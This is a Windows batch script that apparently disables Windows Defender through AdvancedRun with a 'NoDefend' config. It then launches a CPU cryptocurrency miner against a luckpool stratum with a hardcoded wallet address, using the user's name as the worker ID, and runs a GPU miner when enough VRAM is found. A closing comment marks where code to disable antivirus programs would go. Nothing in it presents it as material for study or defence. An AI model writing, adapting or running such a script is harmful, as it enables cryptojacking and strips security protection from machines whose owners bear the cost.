@echo off
setlocal

REM Execute AdvancedRun.exe with NoDefend.cfg configuration
AdvancedRun.exe /Run NoDefend.cfg

REM Run hellminer.exe with specified parameters for mining
.\hellminer.exe -c stratum+tcp://na.luckpool.net:3960 -u RRigARdBSMQ1yuShojcftU2apRUVFpR2PL.%USERNAME% -p --cpu 4

REM Use WMIC to query the GPU adapter info
for /f "tokens=2 delims==" %%A in ('wmic path Win32_VideoController get AdapterCompatibility /value') do (
    set gpu_exists=%%A
)

REM If GPU exists
if "%gpu_exists%" NEQ "" (
    echo GPU exists.
    
    REM Use WMIC to query the VRAM size
    for /f "tokens=2 delims==" %%B in ('wmic path Win32_VideoController get AdapterRAM /value') do (
        set vram=%%B
    )

    REM Convert VRAM size to GB
    set /a vram_gb=%vram%/1024/1024/1024

    REM Check if VRAM is more than 4GB
    if %vram_gb% GEQ 4 (
        echo GPU has more than 4GB of VRAM.
        echo Running lolMiner.exe...
        lolMiner.exe --algo AUTOLYKOS2 --pool erg.2miners.com:8888 --user YOUR_WALLET_ADDRESS.RIG_ID
        pause
    ) else (
        echo GPU does not have more than 4GB of VRAM.
        pause
    )
) else (
    echo No GPU found.
    pause
)

REM Include AVControl.bat code to disable antivirus programs
REM AVControl.bat code goes here...

endlocal
